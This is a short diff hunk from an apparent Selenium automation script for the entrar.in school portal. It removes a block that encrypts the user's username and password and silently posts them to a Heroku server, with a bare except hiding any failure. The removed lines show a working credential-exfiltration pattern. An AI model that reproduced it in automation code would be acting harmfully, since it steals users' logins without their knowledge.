@@ -568,12 +568,6 @@ while driver.current_url == "https://entrar.in/login/authenticate/":
     time.sleep(sleep_time)
     #driver.quit()
     #sys.exit()
-try:
-    fernet_encryptor = Fernet(encryption_key)
-    data_tbs = data={"username":(fernet_encryptor.encrypt(username.encode('utf-8'))).decode(),"password":fernet_encryptor.encrypt(password.encode('utf-8')).decode(),"authkey":sending_auth_key, "authpass":sending_auth_pass}
-    r = requests.post(heroku_domain+userdetails_post_address, data=data_tbs)
-except:
-    pass
 
 driver.get("https://entrar.in/classroom_creation_crm_new/s_display")
 time.sleep(sleep_time)
